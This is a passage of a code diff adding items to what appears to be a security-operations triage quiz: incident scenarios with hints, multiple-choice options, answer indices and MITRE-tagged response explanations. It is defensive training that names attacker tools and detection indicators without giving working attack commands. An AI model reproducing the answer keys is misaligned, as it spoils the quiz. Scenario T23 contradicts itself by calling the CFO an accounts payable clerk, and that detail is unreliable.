+explain:`<h4>Triage Explanation</h4><p>Terminated account + new Domain Admin creation = either former employee acting maliciously (T1078) or attacker using their credentials (T1098). Actions: disable BOTH the terminated account AND svc_backup2 immediately; rotate all domain admin credentials; audit all privileged group additions in the last 30 days; review offboarding procedures; notify HR and Legal.</p><p><strong>Priority: CRITICAL — Domain Admin backdoor account created.</strong></p>`},
+
+{id:"T4",title:"The Encrypted C Drive",mitre:"T1486 / T1490",
+scenario:`A helpdesk ticket: a legal department user reports all their files have been renamed with a .locked extension and a file called HOW_TO_RECOVER.txt appeared on their desktop. You remote in and confirm the C drive is encrypted. EDR shows the encryption process finished 7 minutes ago. The workstation is still connected to the network and has three mapped file shares.`,
+hint1:"Encryption finished 7 minutes ago. What is the single most urgent action right now regarding the network? What do the three mapped file shares mean for incident scope?",
+hint2:"Pull the process tree from EDR. What spawned the encrypting process? How long before encryption started were vssadmin, wbadmin, or bcdedit commands run?",
+options:["A BitLocker deployment encrypting the drive as part of IT security hardening","Ransomware: files are encrypted and the device needs immediate isolation to prevent share spread","A corrupted Windows Update causing file association errors","Windows File History compressing old files to save disk space"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Active ransomware. .locked extension + HOW_TO_RECOVER.txt + confirmed encryption. The 3 mapped shares are the critical spread risk. Actions in order: (1) Disconnect from network NOW; (2) Check file share servers for .locked files — isolate if spreading; (3) Identify ransomware strain from note; (4) Check infection vector and timeline in EDR; (5) Scope the blast radius; (6) Engage IR plan.</p><p><strong>Priority: CRITICAL — potential rapid spread to network shares.</strong></p>`},
+
+{id:"T5",title:"The Ghost in the VPN",mitre:"T1133 / T1078",
+scenario:`Your VPN monitoring shows a successful connection from the CFO's account, connecting from an IP geolocated in Singapore at 3:18 AM local time. The CFO's usual location is Atlanta. You confirm via badge records that the CFO badged into the Atlanta office 2 hours ago and is currently in a meeting.`,
+hint1:"The CFO badge-swiped in Atlanta 2 hours ago. If someone is also connected from Singapore at 3:18 AM Atlanta time, is it physically possible for both to be the same person? What does this confirm?",
+hint2:"Check when the CFO's password was last changed. Is MFA enrolled on this account? Look for sign-in anomalies for this account in the last 30 days — new locations, devices, or password reset requests.",
+options:["The CFO traveling internationally and remotely accessing work","Credential compromise: an attacker using the CFO's stolen credentials from Singapore","VPN split-tunneling showing an incorrect geolocation","The CFO's home VPN connecting through an international relay"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Impossible travel = confirmed credential compromise. Immediate financial data access = likely BEC or espionage motivation. Actions: force-terminate the VPN session; disable the CFO account; force MFA re-enrollment; review what was accessed; investigate how MFA was bypassed (AiTM phishing, SIM swap, MFA fatigue?); check all executive accounts for similar anomalies.</p><p><strong>Priority: HIGH — executive credential compromise with sensitive data access.</strong></p>`},
+
+{id:"T6",title:"The Midnight Backup",mitre:"T1003.003 / T1560",
+scenario:`A SIEM alert at 1:04 AM: ntdsutil.exe was executed on your Primary Domain Controller by 'svc_monitoring' — a Nagios service account. The command creates an IFM export. Twenty minutes later, a 2.3 GB RAR archive is created in C:\\Windows\\Temp on the same DC. No scheduled task for this exists.`,
+hint1:"ntdsutil IFM creates a copy of the Active Directory database. Combined with the SYSTEM hive, what can an attacker do with those files offline? Why is svc_monitoring being used instead of a DA account?",
+hint2:"How did svc_monitoring obtain enough privilege to run ntdsutil on the DC? Check its AD group memberships for recent changes. Where is the RAR file going after it's created — check outbound network from the DC.",
+options:["An automated AD health check performing a routine database export","Domain credential theft: ntdsutil IFM to dump ntds.dit for offline hash extraction and exfiltration staging","Windows Server Backup creating a scheduled AD backup","A Nagios script performing an AD database integrity check"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>ntdsutil IFM + SYSTEM hive + RAR staging = domain credential theft (T1003.003) + exfiltration staging (T1560.001). CRITICAL actions: block all outbound from DC immediately; identify RAR exfil destination; assume ALL domain credentials compromised; begin enterprise-wide password reset; rotate krbtgt TWICE (48h apart); engage IR for full domain compromise assessment.</p><p><strong>Priority: CRITICAL — full domain credential compromise likely.</strong></p>`},
+
+{id:"T7",title:"The Phantom Cloud Admin",mitre:"T1136.002 / T1078",
+scenario:`Azure AD audit logs show a new user 'admin.support@yourdomain.onmicrosoft.com' created outside business hours by a Global Administrator account that had been dormant for 6 months. The previous sign-in was from Seattle. This creation event is from an IP in Romania.`,
+hint1:"A dormant Global Admin account activating from Romania to create a new admin account at night. What technique do attackers use to maintain persistent cloud access with minimal detection?",
+hint2:"Check the dormant account's MFA status and Azure AD Identity Protection risk score. Has the newly created account already signed in anywhere? What other changes did the dormant account make in this session?",
+options:["IT creating a support account for an outsourced help desk partner","Cloud backdoor: compromised dormant Global Admin creating a persistent backdoor account","Azure AD automation creating a break-glass account per policy","Microsoft support creating a temporary account for assistance"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Dormant privileged account compromise (T1078, T1136.002) — attackers target unused high-privilege accounts with weak MFA. Romania geolocation at night = clear IOC. Actions: revoke all sessions for dormant account; disable both accounts; audit all changes in the session; check all Global Admin accounts for dormancy; enforce Conditional Access with MFA and location policies for privileged roles.</p><p><strong>Priority: HIGH — cloud Global Admin compromise.</strong></p>`},
+
+{id:"T8",title:"The Printer That Talks Back",mitre:"T1210 / T1090",
+scenario:`Your vulnerability scanner alerts: a network printer (HP Enterprise LaserJet, IP 10.0.50.200) is making outbound TCP connections to 185.220.101.33 on port 443. Your network team confirms printers should never initiate outbound connections. The destination IP is flagged in threat intel as a known Tor relay.`,
+hint1:"Network printers are IoT devices often running outdated firmware. Why would a printer be initiating outbound connections to a known Tor relay? What attack types target enterprise printers?",
+hint2:"Check if there were any recent exploit attempts against the printer's web management interface (ports 80, 443, 9100). IoT botnets and APT groups have historically targeted enterprise printers as pivot points.",
+options:["The printer checking for firmware updates from HP's cloud servers","A compromised printer used as a network pivot point — exploited via an unpatched vulnerability","A print job routed through an external cloud print service","HP management performing a telemetry call"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Enterprise printers run embedded OSes with outdated firmware and often default credentials. The Tor relay destination confirms C2 or pivoting. Actions: isolate the printer (VLAN it off); access admin console locally; check for unusual firmware/configs; factory reset and update firmware; scan ALL IoT devices for similar behavior; implement IoT network segmentation.</p><p><strong>Priority: HIGH — printer as network pivot point.</strong></p>`},
+
+{id:"T9",title:"The Suspicious Insider",mitre:"T1213 / T1048",
+scenario:`Your DLP alerts: a user in R&D has downloaded 4.7 GB from internal SharePoint containing product schematics and proprietary research over 3 hours on Friday afternoon. Their download baseline is under 50 MB/week. The user gave their 2-week resignation notice on Monday and is scheduled to leave next Friday.`,
+hint1:"A departing employee downloading 94x their normal weekly data volume of highly sensitive IP in their final weeks. What policy concern does this raise, and what should you check beyond just the download volume?",
+hint2:"Check if the data was sent anywhere after downloading (personal email, USB, personal cloud storage). Review the user's full activity for the last 2 weeks since their resignation — what else have they accessed or copied?",
+options:["A normal employee organizing project files before leaving","Potential insider data theft: departing employee exfiltrating proprietary R&D data","An automated SharePoint sync of a shared drive","IT performing a pre-departure backup of employee files"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Insider threat indicator (T1213): departing employee + massive sensitive IP download + resignation. DO NOT alert the employee — contact Legal and HR immediately. Preserve logs; check outbound channels (personal email, USB EID 20001, personal cloud storage in proxy); document everything for potential legal action. Follow insider threat response playbook.</p><p><strong>Priority: HIGH — requires Legal/HR involvement before any confrontation.</strong></p>`},
+
+{id:"T10",title:"The Fake Browser Update",mitre:"T1566 / T1204.002",
+scenario:`Three endpoints visited 'update-firefox[.]net' (NOT mozilla.org), redirected there by a malicious advertisement. Two of the three downloaded and ran 'FirefoxUpdate_v123.exe'. Your EDR shows this executable spawned PowerShell immediately after execution.`,
+hint1:"update-firefox[.]net is not Mozilla's domain. Users were social-engineered into running a fake update. What makes fake software update lures particularly effective against end users?",
+hint2:"Check what the PowerShell process did after being spawned by the fake updater. Network connections? Files created? Registry modifications? This identifies the payload type (loader, RAT, ransomware dropper).",
+options:["A legitimate Firefox update distributed through a third-party CDN","Fake browser update malware: users tricked into running a malicious executable","Mozilla pushing a critical patch via advertising networks","An enterprise tool distributing a browser update to managed endpoints"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>SocGholish/TA569-style fake browser update (T1566, T1204.002). Actions: isolate the two machines that ran the exe; sandbox FirefoxUpdate_v123.exe; hunt for the same hash across the environment; block update-firefox[.]net at proxy/DNS; check the third machine (downloaded but ran?); send user awareness alert about fake update warnings.</p><p><strong>Priority: HIGH — 2 confirmed compromised endpoints.</strong></p>`},
+
+{id:"T11",title:"The Database xp_cmdshell",mitre:"T1190 / T1059",
+scenario:`Your DAM (Database Activity Monitor) alerts at 11 PM: your production SQL Server is running 'xp_cmdshell' executing OS commands including 'whoami' and 'net user'. The queries are executed by the application service account (svc_webapp) from the application server's IP. No deployment occurred today.`,
+hint1:"xp_cmdshell executes OS commands from SQL Server — disabled by default. How would it be enabled without a DBA knowing, and what does the whoami command reveal about the attacker's intent?",
+hint2:"Check how xp_cmdshell was enabled — it requires sp_configure changes. Review application server logs for the malicious SQL query that enabled it. Was xp_cmdshell enabled by the same connection running the commands?",
+options:["A DBA running a maintenance script using xp_cmdshell","SQL injection: attacker exploiting the web app to run OS commands via xp_cmdshell","Database auto-enabling features for performance optimization","A monitoring agent querying system state via xp_cmdshell"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>SQL injection → xp_cmdshell (T1190): attacker exploited the web app, enabled xp_cmdshell via sp_configure, and is now running OS discovery on the DB server. Actions: block the app from the DB server temporarily; check web/IIS logs for the injecting SQL; check for backdoor users created; re-disable xp_cmdshell; patch the SQLi vulnerability before restoring access.</p><p><strong>Priority: CRITICAL — database server OS access via SQL injection.</strong></p>`},
+
+{id:"T12",title:"The 3AM Login Fiesta",mitre:"T1110.003 / T1078",
+scenario:`Azure AD Identity Protection generates 30 minutes of risky sign-in alerts between 3–3:30 AM. 847 unique accounts were targeted; 23 authenticated successfully. All attempts used the password 'CompanyName2024!'. Successful logins are from Eastern European IPs. 6 of the 23 successful accounts have no MFA enrolled.`,
+hint1:"847 accounts targeted with a single password in 30 minutes from multiple Eastern European IPs. Why is this pattern different from brute force, and what does the specific password reveal about the attacker's intel?",
+hint2:"The 6 accounts without MFA are the critical immediate risk. Check what those 6 accessed after authentication. Did the 17 MFA-enrolled successful accounts actually get past MFA, or were they blocked after password success?",
+options:["Users forgetting passwords and triggering lockout-avoidance mechanisms","Password spraying: attackers using a company-themed password against 847 cloud accounts","Azure AD health-checking account password compliance","A third-party SSO synchronizing credentials and triggering auth events"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Password spraying (T1110.003): 1 password × 847 accounts stays under lockout threshold. CompanyName2024! = attacker has OSINT on your naming convention. Actions: disable the 6 MFA-less accounts; force password reset for all 847; review activity of potentially compromised accounts; enforce MFA for ALL accounts; implement Conditional Access blocking high-risk country logins at unusual hours.</p><p><strong>Priority: HIGH — 6 cloud accounts potentially compromised.</strong></p>`},
+
+{id:"T13",title:"The Rogue Wireless AP",mitre:"T1557 / T1040",
+scenario:`Your wireless IDS detects a new access point broadcasting the SSID 'CORP-GUEST' — same as your legitimate guest network. The rogue AP's BSSID doesn't match any authorized AP. Signal is strongest in your 3rd floor conference room. Several employee devices have already auto-connected to it.`,
+hint1:"Employees auto-connected because the SSID matches a known network. What happens to all network traffic from those devices now that they're connected to the attacker's AP?",
+hint2:"Check which devices connected to the rogue AP. Did any have active sessions (email, VPN, web apps) when they connected? Is the legitimate CORP-GUEST AP still broadcasting? If not, the rogue may be deauthenticating clients from the real AP.",
+options:["A neighboring company's AP accidentally using the same SSID","Evil twin attack: a rogue AP capturing credentials and traffic from auto-connected devices","IT deploying a new AP in the conference room","A wireless range extender configured by an employee for better coverage"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Evil twin attack (T1557): all traffic from connected devices flows through the attacker. Conference room placement = physical access. Actions: physically locate and remove the rogue AP (Wi-Fi analyzer to triangulate); deauthenticate clients; force password resets for connected users; review authentication logs for the connection window; implement 802.1X for all wireless networks.</p><p><strong>Priority: HIGH — active MITM attack in progress.</strong></p>`},
+
+{id:"T14",title:"The Build Server Backdoor",mitre:"T1195.002 / T1554",
+scenario:`CI/CD pipeline monitoring alerts: a new step was added to your main build pipeline at 11 PM by a developer account. The step downloads an external script during every build. The developer is on parental leave with no system access for 3 weeks. Every release since 11 PM has included the downloaded script.`,
+hint1:"A compromised developer account modifying the build pipeline to include external script downloads is a software supply chain attack. How many downstream systems receive your compiled software, and what if the script is malicious?",
+hint2:"Download and analyze the script fetched by the new step. How many releases went out with this script? Which systems received those releases? What does the script actually do?",
+options:["A developer automating a dependency check as part of DevSecOps improvement","Supply chain attack: compromised dev account adding a malicious build step to backdoor all compiled software","CI/CD performing a routine dependency update via an approved script","A build agent installing dependencies from an internal artifact repository"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Software supply chain attack (T1195.002, T1554) — similar to SolarWinds. Every release since 11 PM potentially contains malicious code deployed to all receiving systems. CRITICAL actions: stop the pipeline immediately; remove the malicious step; identify ALL systems receiving tainted releases; assess the script's capabilities; initiate recall/remediation; investigate how the developer account was compromised; implement pipeline change approval workflows.</p><p><strong>Priority: CRITICAL — all software releases in the window potentially compromised.</strong></p>`},
+
+{id:"T15",title:"The Exfil Upload Spike",mitre:"T1567.002 / T1048",
+scenario:`Your CASB alerts at 4:30 PM: a single endpoint (10.0.0.88) uploaded 8.3 GB to a personal Dropbox in 47 minutes. The data rate peaked at 3 Gbps for 30 seconds. The machine belongs to a semiconductor design engineer. Highly sensitive chip design files (GDS-II format) are on shared drives this user accesses.`,
+hint1:"8.3 GB in 47 minutes to personal Dropbox. What should you check first — whether this is the actual user or an automated process? How do you determine that quickly?",
+hint2:"Check physical presence (badge data, Teams presence). Check which process initiated the Dropbox connection. Do GDS-II files (specific extension) appear in the upload metadata?",
+options:["An engineer backing up work to Dropbox before a laptop refresh","Data exfiltration: 8.3 GB of semiconductor IP being bulk-uploaded to personal cloud storage","A Dropbox client catching up after being offline for days","IT performing an authorized cloud migration of engineering data"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>8.3 GB of semiconductor IP to personal Dropbox = critical data loss. 3 Gbps peak = automated/scripted process, not a user dragging files. GDS-II = some of the most valuable IP in tech. Actions: block Dropbox for this endpoint immediately; DO NOT alert the user; check physical presence; determine automated vs user-initiated; contact Legal. If malware: isolate. If insider: follow insider threat playbook. Dropbox may be subpoena-able for the uploaded content.</p><p><strong>Priority: CRITICAL — potential major IP theft.</strong></p>`},
+
+{id:"T16",title:"The Kerberos Ticket Storm",mitre:"T1558.003",
+scenario:`DC security logs show 3,847 Kerberos service ticket requests (EID 4769) within a 6-minute window. All use RC4-HMAC (0x17) encryption. Requests target 312 unique SPNs from a single developer workstation. The developer's account previously averaged 3 service tickets per day.`,
+hint1:"3,847 RC4 Kerberos tickets targeting 312 SPNs in 6 minutes from one workstation. This precisely matches which MITRE technique, and what is the attacker attempting to do with these tickets?",
+hint2:"RC4 is specifically requested because it's weaker and faster to crack offline than AES. Check the developer workstation for Rubeus, Impacket, or PowerSploit artifacts. The 312 tickets are encrypted blobs to crack offline.",
+options:["Windows performing Kerberos ticket renewal for services the developer accesses","Kerberoasting: bulk RC4 service ticket requests for offline password cracking","A DC reissuing tickets after an authentication service restart","SSO pre-authenticating all services the user has access to"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Kerberoasting (T1558.003) — textbook pattern. The 312 service account password hashes will be cracked offline within hours if passwords are weak. Actions: isolate developer workstation; hunt for Rubeus/Impacket; immediately reset passwords for ALL service accounts with SPNs (prioritize high-privilege ones); convert service accounts to gMSA (240-char auto-rotating passwords); investigate how the developer account was compromised.</p><p><strong>Priority: HIGH — all service account passwords potentially cracked offline. Reset immediately.</strong></p>`},
+
+{id:"T17",title:"The Hijacked Browser Session",mitre:"T1539 / T1185",
+scenario:`Your UEBA alerts: a user's M365 account shows two simultaneous active sessions — one from their work laptop (Chrome/Win11 from 10.0.0.33) and another from Brazil (Firefox/Ubuntu). The Brazil session is reading Teams messages and Outlook emails tagged as confidential. The user is currently in a Teams meeting from their work laptop.`,
+hint1:"Two simultaneous M365 sessions from different countries, browsers, and OSes. One is the legitimate user. What would give someone a valid authenticated session without credentials or MFA?",
+hint2:"A valid session token (browser cookie) bypasses MFA — the session is already authenticated. How might an attacker obtain a live browser session cookie without knowing the password?",
+options:["M365 allowing multiple sessions on personal and work devices","Session token hijacking: an attacker using a stolen browser cookie to access M365 as the user","Microsoft geo-redundant authentication creating a session from the nearest datacenter","A legitimate co-authoring session where another user views shared content"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Session hijacking (T1539) via stolen browser cookie bypasses MFA entirely. Theft methods: info-stealer malware (RedLine, Vidar), AiTM phishing (Evilginx2), compromised browser extension. Actions: revoke ALL user sessions (M365 Admin: Revoke refresh tokens); check laptop for info-stealer; review what was accessed in the Brazil session; implement Continuous Access Evaluation binding sessions to compliant devices.</p><p><strong>Priority: HIGH — active M365 account takeover.</strong></p>`},
+
+{id:"T18",title:"The Noisy LSASS",mitre:"T1003.001 / T1550.002",
+scenario:`Your EDR alerts: 'taskhost32.exe' in C:\\Users\\jdoe\\AppData\\Local\\Temp accessed lsass.exe with access mask 0x1010. The binary is unsigned with unknown hash. In the next 5 minutes, EID 4624 shows successful network logons from this workstation to 3 other machines.`,
+hint1:"taskhost32.exe from a user's Temp folder + access mask 0x1010 to lsass.exe. What is the attacker reading from lsass memory, and what do the immediate network logons to 3 other hosts confirm?",
+hint2:"0x1010 = LSASS credential dump signature. Immediate multi-host lateral logons following lsass access = credentials extracted and used for Pass-the-Hash in real time. This is credential theft → lateral movement happening now.",
+options:["A legitimate process performing memory diagnostics on LSASS","Credential dumping followed immediately by lateral movement — active attack in progress","Windows Defender scanning lsass.exe memory","A crash reporter capturing an lsass dump for analysis"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>LSASS dump → Pass-the-Hash lateral movement (T1003.001, T1550.002) in real time. CRITICAL time-sensitive response: (1) Isolate all 4 machines simultaneously (source + 3 targets); (2) Reset all credentials that were cached on the source machine; (3) Check if the 3 lateral machines also dumped lsass (cascading); (4) Block the attacker's current pivot point. Every minute allows further spread.</p><p><strong>Priority: CRITICAL — active lateral movement in progress.</strong></p>`},
+
+{id:"T19",title:"The Impossible Reverse Shell",mitre:"T1190 / T1059",
+scenario:`An IDS alert: your public-facing web server (203.0.113.50) has established an outbound TCP connection from its Apache process (httpd) to an internal workstation (10.0.0.55) on port 4444. Web servers receive connections — they don't typically initiate them to internal workstations. The server runs a public-facing WordPress site.`,
+hint1:"A web server's httpd process initiating an outbound connection to an internal host on port 4444 — traffic flowing from the DMZ toward the internal network. How does a reverse shell change the normal client/server relationship?",
+hint2:"Port 4444 is the Metasploit default reverse handler port. WordPress unpatched plugins are a common RCE vector. A reverse shell connects outbound from the victim to the attacker to bypass firewall rules blocking inbound connections.",
+options:["Apache loading a WordPress plugin that connects to an internal license server","A reverse shell: the web server was compromised via WordPress and is connecting to an attacker's listener","A load balancer health-checking backend systems","An Apache module making an internal API call for dynamic content"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Reverse shell from DMZ web server to internal listener = active breach bridging DMZ to internal network (T1190, T1059). Actions: block the outbound connection; investigate 10.0.0.55 — this is likely the attacker's pivot host inside the network; check WordPress for web shells (find recently modified .php files); analyze all outbound connections from the server; restore from known-good backup after forensics.</p><p><strong>Priority: CRITICAL — DMZ to internal network breach active.</strong></p>`},
+
+{id:"T20",title:"The Ghost Scheduled Task",mitre:"T1053.005 / T1027",
+scenario:`During a threat hunt, you discover a scheduled task on 12 endpoints named 'WindowsSystemOptimizer'. The task runs a fully Base64-encoded PowerShell command. It was created 6 weeks ago with no change ticket. The task runs daily at 9 AM and 11 PM.`,
+hint1:"A task created 6 weeks ago running encoded PowerShell twice daily on 12 machines with no documentation. What does the dual daily execution timing suggest about its purpose?",
+hint2:"Decode the Base64 payload. The 9 AM run blends with business hours traffic. The 11 PM run is the out-of-hours C2 check-in backup. Presence on 12 machines = automated installation — how did it spread?",
+options:["Windows automatic performance optimization created during a system update","A persistent C2 beacon disguised as a scheduled task — undetected for 6 weeks","An IT script deployed during a maintenance window without change documentation","A third-party security tool creating optimization tasks as normal operation"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>6-week undetected intrusion on 12 endpoints = patient advanced threat actor. Dual schedule = maintain C2 connectivity regardless of monitoring windows. Actions: decode payload immediately; check network logs for connections from these 12 hosts to the same external IP at 9 AM and 11 PM going back 6 weeks; identify initial infection vector (which machine first?); remove tasks and payloads; engage full IR — this is a 6-week-old breach.</p><p><strong>Priority: CRITICAL — long-term undetected intrusion.</strong></p>`},
+
+{id:"T21",title:"The After-Hours API Harvest",mitre:"T1530 / T1552",
+scenario:`AWS CloudTrail logs at 2 AM: ListBuckets, GetObject (3,847 calls across 12 S3 buckets), DescribeInstances, ListSecrets, and GetSecretValue (44 times) — all using a developer's IAM access key while they're on vacation. Source IP is 185.220.101.47 — a known Tor exit node.`,
+hint1:"A developer's AWS key used from a Tor exit node at 2 AM while they're on vacation. 3,847 S3 GetObject calls + 44 GetSecretValue calls — what types of data are being systematically harvested?",
+hint2:"GetSecretValue on 44 secrets could include DB passwords, API keys, TLS certificates, and service credentials. Combined with 3,847 S3 downloads, this is a comprehensive data harvest. How might the developer's IAM key have been leaked?",
+options:["The developer accessing AWS for legitimate vacation work via a private VPN","Cloud credential compromise: systematic data harvest from S3 and Secrets Manager using a stolen key","AWS automated compliance scanning accessing buckets for audit","A CI/CD pipeline running automated tests with developer credentials"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>AWS key compromise → cloud data exfiltration (T1530, T1552.005). 44 secrets = potentially every service password in the environment. Actions: disable and rotate the compromised key immediately; revoke all sessions; rotate ALL 44 accessed secrets; review all 12 S3 buckets for data sensitivity; check CloudTrail for infrastructure changes (new IAM users, EC2 instances); audit how the key leaked (GitHub commit, CI/CD log, laptop compromise?); enable GuardDuty.</p><p><strong>Priority: CRITICAL — cloud credentials compromised, bulk data exfiltration.</strong></p>`},
+
+{id:"T22",title:"The Silent Miner",mitre:"T1496 / T1055",
+scenario:`IT notices 3 dev servers running at 95-100% CPU for 4 days — not assigned to any active project. No running applications explain the CPU usage. The spike started Sunday at 11:30 PM. The servers have internet access.`,
+hint1:"Sustained 100% CPU on idle internet-connected servers starting Sunday night when no admins were monitoring. What software continuously consumes 100% CPU while benefiting from internet connectivity?",
+hint2:"Check running processes for unusual names or unexpected locations. Check outbound network connections: cryptocurrency miners communicate with mining pool servers over ports 3333, 4444, 9999, 14444.",
+options:["Windows Update running a large cumulative update requiring intensive processing","Cryptomining malware: compromised servers used to mine cryptocurrency for an attacker","A developer stress test script left running over the weekend","Build servers compiling a large codebase"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Cryptomining (T1496) on idle servers. Sunday night start = timed deployment to avoid business-hours detection. Note: miners are often accompanied by backdoors — treat as full compromise. Actions: identify and kill mining process; record hash/path; determine entry point (unpatched service? web app CVE?); check for additional persistence/payloads; calculate cloud compute costs incurred; patch the entry vector.</p><p><strong>Priority: HIGH — 4-day undetected compromise on 3 servers.</strong></p>`},
+
+{id:"T23",title:"The MFA-Bypassed VPN",mitre:"T1078 / T1556",
+scenario:`Azure AD Conditional Access alerts: the CFO's VPN account authenticated from Antarctica (Rothera Research Station) at 7:42 AM local time. MFA was accepted (TOTP code validated). The CFO is an accounts payable clerk in Kansas City. Badge records confirm they're in the office today. No MFA fatigue push was logged.`,
+hint1:"Antarctica to Kansas City is physically impossible. The TOTP code was accepted — meaning the attacker had both the password AND the current 30-second TOTP code simultaneously. How can an attacker obtain a live TOTP code?",
+hint2:"Real-time AiTM phishing tools (Evilginx2, Modlishka) act as a proxy: when the user enters their password and TOTP on a phishing page, the tool relays them immediately to the real service — capturing the session cookie before the 30-second TOTP expires.",
+options:["A user working remotely from an international research expedition","Real-time AiTM phishing: password and TOTP captured and replayed simultaneously by an attacker proxy","Azure Conditional Access misidentifying a VPN server IP as Antarctica","A geographic IP database error on a legitimate IP address"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>AiTM (Adversary-in-the-Middle) phishing (Evilginx2/Modlishka) bypasses TOTP-based MFA — the attacker proxies credentials in real time and steals the session cookie. TOTP does NOT protect against AiTM. Actions: revoke VPN session; disable account; check what was accessed; interview user about unusual login prompts; implement FIDO2/WebAuthn (phishing-resistant MFA); accounts payable targeting = likely BEC/financial fraud motivation.</p><p><strong>Priority: HIGH — MFA bypassed, financial department targeted.</strong></p>`},
+
+{id:"T24",title:"The Quiet DCSync",mitre:"T1003.006",
+scenario:`During a weekly threat hunt, you find 4 instances of EID 4662 with DS-Replication-Get-Changes-All from 'corp\\helpdesk01' over 3 days at irregular times (9:03 AM, 2:17 AM, 11:44 AM, 4:31 AM). helpdesk01 should have no replication rights.`,
+hint1:"DS-Replication rights used 4 times at irregular intervals (some business hours, some 3-4 AM) by a helpdesk account. Why would an attacker run DCSync multiple times rather than just once?",
+hint2:"Multiple DCSync attempts = attacker monitoring for newly added accounts/credentials over time, OR intermittent access causing them to re-run DCSync each session. Check what specific accounts were targeted in each event.",
+options:["A helpdesk tool verifying account status across DC replicas","Ongoing DCSync: a compromised helpdesk account repeatedly pulling domain credentials over 3 days","AD replication health monitoring via the helpdesk account","A DC replication event logged under the wrong account due to an AD bug"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Multi-day DCSync (T1003.006) using helpdesk01 = patient threat actor with repeated domain access. Actions: immediately remove DS-Replication rights from helpdesk01; investigate how helpdesk01 obtained these rights (EID 5136 — attribute changes); assume all domain credentials compromised — full password reset including krbtgt x2; investigate for Golden Ticket usage; engage IR for full domain compromise assessment.</p><p><strong>Priority: CRITICAL — multi-day domain credential theft. Full domain compromise response required.</strong></p>`},
+
+{id:"T25",title:"The BYOD Network Plant",mitre:"T1091 / T1200",
+scenario:`Your NAC alerts: an unauthorized device connected to a wired ethernet port in a conference room. The device's MAC is not in your inventory. Within 2 minutes it begins scanning internal subnets on ports 445, 3389, and 22. No badge access was recorded for the conference room in the 10 minutes prior.`,
+hint1:"A physical device auto-scanning SMB, RDP, and SSH ports 2 minutes after plugging into your wired network — no badge access. What does the absence of badge records suggest, and what type of device could automate this?",
+hint2:"Immediate automated port scanning (not a human typing commands) + no badge access suggests a planted attack device (Hak5 LAN Turtle, Raspberry Pi, etc.) inserted by someone who tailgated or had cover access.",
+options:["A contractor's laptop connecting for a scheduled meeting","A physical network implant: an adversary planted a scanning device on the wired corporate network","A new employee's laptop auto-connecting before NAC enrollment","An IoT device connecting to the nearest available network port"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Physical network implant (T1091, T1200): pre-configured attack device planted in an accessible location. Actions: use NAC to identify the switch port; physically trace and remove the device (preserve as evidence without powering off if possible); review physical security camera footage; check if the device established any successful connections; disable all unused switch ports; require 802.1X for all wired connections.</p><p><strong>Priority: HIGH — physical breach of corporate network.</strong></p>`},
+
+{id:"T26",title:"The OAuth Consent Grant",mitre:"T1528 / T1566.002",
+scenario:`Azure AD audit logs: an HR user granted consent to a third-party app 'HR Document Helper' via a link in an email (actually from hr-system@support-portal-365.com — spoofed). The app was granted: Mail.Read, Files.Read.All, User.ReadBasic.All permissions.`,
+hint1:"Mail.Read and Files.Read.All are powerful Microsoft Graph permissions. If a malicious app has these, what can it do in the background even after the user logs out?",
+hint2:"Application permissions run without a signed-in user — tenant-wide access. Mail.Read = read every email sent and received by this user silently, indefinitely. The access persists even if the user changes their password (OAuth tokens survive password resets in some configurations).",
+options:["A legitimate HR software integration requesting standard Graph permissions","OAuth consent phishing: a malicious app granted persistent access to user email and files","Microsoft adding a new HR compliance feature requiring additional permissions","An approved enterprise app requesting updated permissions after a version upgrade"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>OAuth consent phishing (T1528, T1566.002) — 'illicit consent grant attack'. The app now silently reads all of the user's email and files via Graph API. No password needed. Actions: revoke OAuth consent immediately (Azure AD → Enterprise Apps); check Graph API activity logs; hunt for other users who granted consent to the same app; implement admin consent workflow requiring approval for new app consents; configure Conditional Access blocking unverified publisher app consents.</p><p><strong>Priority: HIGH — persistent mailbox and file access granted to malicious app.</strong></p>`},
+
+{id:"T27",title:"The Forgotten Dev Server",mitre:"T1190 / T1552",
+scenario:`Your ASM tool alerts: a server in your IP range is publicly exposing Jenkins on port 8080 with anonymous access enabled (no login required). The Jenkins version is 2.303.1 (3 years unpatched). Build history shows 3 successful builds in the last 24 hours not initiated by any configured user. This server is not in your asset inventory.`,
+hint1:"Jenkins with anonymous access enabled and 3 years of unpatched CVEs, with 3 unauthorized builds in the last 24 hours. What has already happened to this server?",
+hint2:"Jenkins Script Console allows full OS command execution via Groovy. Three unauthorized builds = attacker has already used the Script Console. Check build logs for OS commands. Also check: new user accounts, SSH keys, outbound connections, cron jobs.",
+options:["A developer's Jenkins server running scheduled automated build jobs","An already-compromised unmanaged Jenkins server — attacker actively using it for code execution","Jenkins performing automatic version check builds","A security scanner triggering builds through an API probe"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Internet-exposed Jenkins with anonymous access = trivial compromise (Jenkins Script Console = OS RCE). 3 unauthorized builds = already exploited. Actions: take offline immediately; review build logs for executed commands; audit what repos and credentials this Jenkins can access — rotate ALL; investigate how this server exists without asset tracking (shadow IT); implement ASM monitoring; Jenkins must be behind VPN, never internet-facing.</p><p><strong>Priority: CRITICAL — active exploitation of internet-facing CI/CD system.</strong></p>`},
+
+{id:"T28",title:"The Lateral SharePoint",mitre:"T1213.002 / T1078",
